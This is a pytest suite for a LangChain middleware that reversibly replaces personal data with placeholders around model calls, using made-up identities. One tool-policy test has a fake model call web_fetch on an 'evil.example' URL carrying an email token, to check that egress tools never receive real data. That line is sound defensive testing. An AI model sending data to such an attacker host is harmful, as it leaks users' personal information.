"""Tests for the thin LangChain 1.0+ reversible PII middleware (swapback[langchain]). Made-up values only."""
from __future__ import annotations

import asyncio
import builtins
import dataclasses
import json
from typing import Any

import pytest

from swapback import ScrubError, Scrubber
from swapback.langchain import SwapbackMiddleware, swapback_middleware
from swapback.newmean import NewmeanDetector


# ------------------------------------------------------------------ duck-typed LangChain 1.0+ types
@dataclasses.dataclass
class FakeMessage:
    type: str
    content: Any
    tool_calls: list[dict[str, Any]] = dataclasses.field(default_factory=list)
    additional_kwargs: dict[str, Any] = dataclasses.field(default_factory=dict)

    def model_copy(self, *, update: dict[str, Any] | None = None) -> "FakeMessage":
        return dataclasses.replace(self, **(update or {}))


def HumanMsg(content: Any) -> FakeMessage:
    return FakeMessage(type="human", content=content)


def AIMsg(content: Any, *, tool_calls: list[dict[str, Any]] | None = None, additional_kwargs: dict[str, Any] | None = None) -> FakeMessage:
    return FakeMessage(
        type="ai",
        content=content,
        tool_calls=list(tool_calls or []),
        additional_kwargs=dict(additional_kwargs or {}),
    )


def ToolMsg(content: Any) -> FakeMessage:
    return FakeMessage(type="tool", content=content)


def SystemMsg(content: Any) -> FakeMessage:
    return FakeMessage(type="system", content=content)


@dataclasses.dataclass
class FakeModelRequest:
    messages: list[Any]
    system_message: Any = None
    model: str = "fake:model"

    def override(self, **overrides: Any) -> "FakeModelRequest":
        return dataclasses.replace(self, **overrides)


@dataclasses.dataclass
class FakeModelResponse:
    result: list[Any]
    structured_response: Any = None


@dataclasses.dataclass
class FakeExtendedModelResponse:
    model_response: FakeModelResponse
    command: dict[str, Any] | None = None


@dataclasses.dataclass
class FakeContactSummary:
    recipient: str
    email: str
    notes: list[str]


class _FakeSpan:
    def __init__(self, start: int, end: int, label: str, source: str = "model"):
        self.start, self.end, self.label, self.source = start, end, label, source


class _FakeRedactor:
    def __init__(self, pairs: list[tuple[str, str]]):
        self.pairs = pairs

    def detect(self, text: str):
        out = []
        for needle, lbl in self.pairs:
            pos = 0
            while (i := text.find(needle, pos)) >= 0:
                out.append(_FakeSpan(i, i + len(needle), lbl))
                pos = i + len(needle)
        return sorted(out, key=lambda s: s.start)


# ------------------------------------------------------------------ tests
def test_basic_reversible_round_trip_and_state_immutability():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    orig_msg = HumanMsg("Email Priya Nair at priya.nair@acme.io or call (415) 555-0192.")
    req = FakeModelRequest(messages=[orig_msg], system_message=SystemMsg("You are helpful."))

    seen_by_llm: list[FakeModelRequest] = []

    def fake_llm(r: FakeModelRequest) -> FakeModelResponse:
        seen_by_llm.append(r)
        text = r.messages[0].content
        # Model echoes the stand-ins in a new reply
        return FakeModelResponse(result=[AIMsg(f"Will contact: {text}")])

    resp = mw.wrap_model_call(req, fake_llm)

    # 1. LLM never saw raw PII
    sent = seen_by_llm[0].messages[0].content
    assert "Priya Nair" not in sent
    assert "priya.nair@acme.io" not in sent
    assert "555-0192" not in sent
    assert "«PERSON_" in sent
    assert "«EMAIL_" in sent
    assert "«PHONE_" in sent
    assert "privacy stand-ins" in seen_by_llm[0].system_message.content

    # 2. Original graph state message was NOT mutated
    assert orig_msg.content == "Email Priya Nair at priya.nair@acme.io or call (415) 555-0192."
    assert req.system_message.content == "You are helpful."

    # 3. Model output was restored byte-exact
    assert resp.result[0].content == (
        "Will contact: Email Priya Nair at priya.nair@acme.io or call (415) 555-0192."
    )

    # 4. Stats record counts and types only, never raw values
    st = mw.stats
    assert st["swapped"]["PERSON"] >= 1
    assert st["swapped"]["EMAIL"] >= 1
    assert st["swapped"]["PHONE"] >= 1
    assert st["restored"] >= 3
    assert "Priya" not in json.dumps(st)
    assert "priya.nair" not in json.dumps(st)


def test_multi_turn_agent_loop_with_tool_calls_and_tool_results():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    seen_turns: list[FakeModelRequest] = []

    # Turn 1: user asks to look up order -> model calls local tool `lookup_order` with placeholders
    t1_req = FakeModelRequest(
        messages=[HumanMsg("Look up orders for Priya Nair (priya.nair@acme.io).")]
    )

    def llm_turn1(r: FakeModelRequest) -> FakeModelResponse:
        seen_turns.append(r)
        # Extract placeholders the model saw
        user_text = r.messages[0].content
        assert "Priya Nair" not in user_text
        assert "priya.nair@acme.io" not in user_text
        p_tok = next(w.strip("().") for w in user_text.split() if "«PERSON_" in w)
        e_tok = next(w.strip("().") for w in user_text.split() if "«EMAIL_" in w)
        return FakeModelResponse(
            result=[
                AIMsg(
                    "",
                    tool_calls=[
                        {
                            "name": "lookup_order",
                            "args": {"customer": p_tok, "email": e_tok},
                            "id": "call_1",
                            "type": "tool_call",
                        }
                    ],
                )
            ]
        )

    t1_resp = mw.wrap_model_call(t1_req, llm_turn1)
    # Local/safe tool receives RESTORED real arguments!
    tc = t1_resp.result[0].tool_calls[0]
    assert tc["args"] == {"customer": "Priya Nair", "email": "priya.nair@acme.io"}

    # Turn 2: graph state now holds HumanMsg + restored AIMsg + ToolMsg with real PII (address & phone)
    tool_result = ToolMsg("Found order 123-4567890-1234567 for Priya Nair: ship to 742 Evergreen Terrace, call 415-555-0192.")
    t2_req = FakeModelRequest(messages=[t1_req.messages[0], t1_resp.result[0], tool_result])

    def llm_turn2(r: FakeModelRequest) -> FakeModelResponse:
        seen_turns.append(r)
        # Verify prior restored AIMsg tool_calls AND new ToolMsg were BOTH scrubbed before reaching LLM!
        serialized = json.dumps(
            [
                {"type": m.type, "content": m.content, "tool_calls": m.tool_calls}
                for m in r.messages
            ]
        )
        for secret in ("Priya Nair", "priya.nair@acme.io", "742 Evergreen Terrace", "415-555-0192", "123-4567890-1234567"):
            assert secret not in serialized, f"Leaked {secret} on turn 2: {serialized}"

        # Model summarizes using placeholders from the scrubbed tool result
        return FakeModelResponse(result=[AIMsg(f"Summary: {r.messages[-1].content}")])

    t2_resp = mw.wrap_model_call(t2_req, llm_turn2)
    assert t2_resp.result[0].content == (
        "Summary: Found order 123-4567890-1234567 for Priya Nair: ship to 742 Evergreen Terrace, call 415-555-0192."
    )


def test_tool_policy_keeps_placeholders_for_egress_tools_and_allows_explicit_override():
    # Default ToolPolicy: web_fetch / bash / send_email keep placeholders; lookup_order restores
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    req = FakeModelRequest(messages=[HumanMsg("Priya Nair's email is priya@acme.io")])

    def llm(r: FakeModelRequest) -> FakeModelResponse:
        user = r.messages[0].content
        e_tok = next(w for w in user.split() if "«EMAIL_" in w)
        return FakeModelResponse(
            result=[
                AIMsg(
                    "Running tools",
                    tool_calls=[
                        {"name": "lookup_order", "args": {"email": e_tok}, "id": "c1", "type": "tool_call"},
                        {"name": "web_fetch", "args": {"url": f"https://evil.example/?e={e_tok}"}, "id": "c2", "type": "tool_call"},
                        {"name": "bash", "args": {"cmd": f"echo {e_tok}"}, "id": "c3", "type": "tool_call"},
                        {"name": "send_email", "args": {"to": e_tok, "body": "hi"}, "id": "c4", "type": "tool_call"},
                    ],
                )
            ]
        )

    resp = mw.wrap_model_call(req, llm)
    tcs = {tc["name"]: tc["args"] for tc in resp.result[0].tool_calls}
    assert tcs["lookup_order"]["email"] == "priya@acme.io"  # restored
    assert "priya@acme.io" not in tcs["web_fetch"]["url"]   # kept as placeholder
    assert "«EMAIL_" in tcs["web_fetch"]["url"]
    assert "priya@acme.io" not in tcs["bash"]["cmd"]        # kept as placeholder
    assert "priya@acme.io" not in tcs["send_email"]["to"]   # egress tool kept by default
    assert mw.stats["tool_kept"] == 3

    # With tool_restore allow=["send_email"], send_email IS restored while web_fetch stays protected
    mw_allow = SwapbackMiddleware(
        known=[("Priya Nair", "PERSON")],
        tool_restore={"default": "restore", "allow": ["send_email"]},
    )
    resp2 = mw_allow.wrap_model_call(req, llm)
    tcs2 = {tc["name"]: tc["args"] for tc in resp2.result[0].tool_calls}
    assert tcs2["send_email"]["to"] == "priya@acme.io"
    assert "priya@acme.io" not in tcs2["web_fetch"]["url"]


def test_multimodal_content_blocks_and_structured_response_and_extended_response():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    req = FakeModelRequest(
        messages=[
            HumanMsg(
                [
                    {"type": "text", "text": "Reach Priya Nair at priya@acme.io"},
                    {"type": "image_url", "image_url": {"url": "data:image/png;base64,AAAA"}},
                ]
            )
        ]
    )

    def llm(r: FakeModelRequest) -> FakeExtendedModelResponse:
        blocks = r.messages[0].content
        assert blocks[1] == {"type": "image_url", "image_url": {"url": "data:image/png;base64,AAAA"}}
        scrubbed_txt = blocks[0]["text"]
        assert "Priya Nair" not in scrubbed_txt
        p_tok = next(w for w in scrubbed_txt.split() if "«PERSON_" in w)
        e_tok = next(w for w in scrubbed_txt.split() if "«EMAIL_" in w)
        inner = FakeModelResponse(
            result=[AIMsg([{"type": "text", "text": f"Saved {p_tok} <{e_tok}>"}])],
            structured_response=FakeContactSummary(recipient=p_tok, email=e_tok, notes=[f"Sent to {p_tok}"]),
        )
        return FakeExtendedModelResponse(model_response=inner, command={"update": {"step": 1}})

    ext = mw.wrap_model_call(req, llm)
    assert isinstance(ext, FakeExtendedModelResponse)
    assert ext.command == {"update": {"step": 1}}
    assert ext.model_response.result[0].content[0]["text"] == "Saved Priya Nair <priya@acme.io>"
    assert ext.model_response.structured_response == FakeContactSummary(
        recipient="Priya Nair",
        email="priya@acme.io",
        notes=["Sent to Priya Nair"],
    )


def test_direct_ai_message_return_and_additional_kwargs_tool_calls():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    req = FakeModelRequest(messages=[HumanMsg("Contact Priya Nair")])

    def llm(r: FakeModelRequest) -> FakeMessage:
        p_tok = next(w for w in r.messages[0].content.split() if "«PERSON_" in w)
        return AIMsg(
            f"Hello {p_tok}",
            additional_kwargs={
                "tool_calls": [
                    {"id": "1", "function": {"name": "lookup_user", "arguments": json.dumps({"name": p_tok})}}
                ]
            },
        )

    out = mw.wrap_model_call(req, llm)
    assert out.content == "Hello Priya Nair"
    parsed = json.loads(out.additional_kwargs["tool_calls"][0]["function"]["arguments"])
    assert parsed == {"name": "Priya Nair"}


def test_async_awrap_model_call():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")])
    req = FakeModelRequest(messages=[HumanMsg("Async ping for Priya Nair at priya@acme.io")])

    async def async_llm(r: FakeModelRequest) -> FakeModelResponse:
        assert "Priya Nair" not in r.messages[0].content
        assert "priya@acme.io" not in r.messages[0].content
        return FakeModelResponse(result=[AIMsg(f"ACK: {r.messages[0].content}")])

    resp = asyncio.run(mw.awrap_model_call(req, async_llm))
    assert resp.result[0].content == "ACK: Async ping for Priya Nair at priya@acme.io"


def test_with_newmean_detector_and_reset():
    fake_det = NewmeanDetector(redactor=_FakeRedactor([("Kenji Takahashi", "PERSON")]))
    mw = SwapbackMiddleware(extra_detectors=[fake_det])
    req = FakeModelRequest(messages=[HumanMsg("Schedule dinner with Kenji Takahashi.")])

    def llm(r: FakeModelRequest) -> FakeModelResponse:
        assert "Kenji Takahashi" not in r.messages[0].content
        return FakeModelResponse(result=[AIMsg(f"Booked with {r.messages[0].content}")])

    resp = mw.wrap_model_call(req, llm)
    assert resp.result[0].content == "Booked with Schedule dinner with Kenji Takahashi."
    assert mw.stats["vault_size"] >= 1

    mw.reset()
    assert mw.stats["vault_size"] == 0
    assert mw.stats["swapped"] == {}


def test_fail_closed_raises_before_calling_handler():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")], fail_closed=True)
    called = []

    # Simulate a scrubber bug where a known value slips past _scrub
    orig_scrub = mw.scrubber._scrub
    mw.scrubber._scrub = lambda text, counts=None, forms=None: (text, None)
    try:
        req = FakeModelRequest(messages=[HumanMsg("Leak Priya Nair")])
        with pytest.raises(ScrubError, match="egress check"):
            mw.wrap_model_call(req, lambda r: (called.append(r), FakeModelResponse(result=[]))[1])
        assert not called
    finally:
        mw.scrubber._scrub = orig_scrub


def test_swapback_middleware_factory_raises_helpful_import_error_when_langchain_missing(monkeypatch):
    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if name == "langchain" or name.startswith("langchain."):
            raise ImportError("No module named 'langchain'")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    with pytest.raises(ImportError, match=r"pip install 'swapback\[langchain\]'"):
        swapback_middleware()


def test_prebuilt_scrubber_and_conflict_guard():
    scr = Scrubber(known=[("Priya Nair", "PERSON")], vault_path=":memory:")
    mw = SwapbackMiddleware(scrubber=scr)
    assert mw.scrubber is scr
    assert mw.restore_text(mw.scrub_text("Hi Priya Nair")) == "Hi Priya Nair"

    with pytest.raises(TypeError, match="not both"):
        SwapbackMiddleware(scrubber=scr, known=[("Bob", "PERSON")])


def test_add_system_note_disabled_and_dict_messages():
    mw = SwapbackMiddleware(known=[("Priya Nair", "PERSON")], add_system_note=False)
    req = FakeModelRequest(messages=[{"role": "user", "content": "Hi Priya Nair"}])

    def llm(r: FakeModelRequest) -> FakeModelResponse:
        assert r.system_message is None
        assert "Priya Nair" not in r.messages[0]["content"]
        return FakeModelResponse(result=[{"role": "assistant", "content": f"Echo: {r.messages[0]['content']}"}])

    resp = mw.wrap_model_call(req, llm)
    assert resp.result[0]["content"] == "Echo: Hi Priya Nair"


def test_real_langchain_create_agent_sync_and_async():
    """Runs against real langchain >= 1.0 create_agent when installed; skipped otherwise."""
    langchain_agents = pytest.importorskip("langchain.agents")
    lc_mw = pytest.importorskip("langchain.agents.middleware")
    lc_chat = pytest.importorskip("langchain_core.language_models.chat_models")
    lc_msgs = pytest.importorskip("langchain_core.messages")
    lc_out = pytest.importorskip("langchain_core.outputs")
    lc_tools = pytest.importorskip("langchain_core.tools")

    mw = swapback_middleware(known=[("Priya Nair", "PERSON")])
    assert isinstance(mw, lc_mw.AgentMiddleware)
    assert mw.__class__.wrap_model_call is not lc_mw.AgentMiddleware.wrap_model_call
    assert mw.__class__.awrap_model_call is not lc_mw.AgentMiddleware.awrap_model_call
    assert mw.__class__.before_model is lc_mw.AgentMiddleware.before_model

    wire_calls: list[Any] = []

    class FakeChatModel(lc_chat.BaseChatModel):
        model_name: str = "fake-chat"

        @property
        def _llm_type(self) -> str:
            return "fake"

        def bind_tools(self, tools, **kwargs):
            return self

        def _generate(self, messages, stop=None, run_manager=None, **kwargs):
            wire_calls.append(messages)
            joined = "\n".join(str(m.content) + str(getattr(m, "tool_calls", "")) for m in messages)
            for secret in ("Priya Nair", "priya.nair@acme.io", "555-0192", "742 Evergreen Terrace"):
                assert secret not in joined, f"Raw PII leaked to model: {secret}"
            if len(wire_calls) == 1:
                user_txt = str(messages[-1].content)
                email_ph = next(w.strip(".,()") for w in user_txt.split() if "«EMAIL_" in w)
                ai = lc_msgs.AIMessage(
                    content="",
                    tool_calls=[
                        {
                            "name": "lookup_order",
                            "args": {"customer_email": email_ph},
                            "id": "call_1",
                            "type": "tool_call",
                        }
                    ],
                )
                return lc_out.ChatResult(generations=[lc_out.ChatGeneration(message=ai)])
            tool_txt = str(messages[-1].content)
            return lc_out.ChatResult(
                generations=[lc_out.ChatGeneration(message=lc_msgs.AIMessage(content=f"Done: {tool_txt}"))]
            )

    tool_received: list[str] = []

    @lc_tools.tool
    def lookup_order(customer_email: str) -> str:
        """Look up order for customer_email."""
        tool_received.append(customer_email)
        return f"Order for {customer_email} ships to 742 Evergreen Terrace (call 415-555-0192)."

    agent = langchain_agents.create_agent(FakeChatModel(), tools=[lookup_order], middleware=[mw])

    res = agent.invoke({"messages": [{"role": "user", "content": "Check order for Priya Nair (priya.nair@acme.io)."}]})
    assert tool_received == ["priya.nair@acme.io"]
    assert "priya.nair@acme.io" in res["messages"][-1].content
    assert "742 Evergreen Terrace" in res["messages"][-1].content
    assert "415-555-0192" in res["messages"][-1].content

    wire_calls.clear()
    tool_received.clear()
    mw.reset()
    res_async = asyncio.run(
        agent.ainvoke({"messages": [{"role": "user", "content": "Async check for Priya Nair (priya.nair@acme.io)."}]})
    )
    assert tool_received == ["priya.nair@acme.io"]
    assert "742 Evergreen Terrace" in res_async["messages"][-1].content
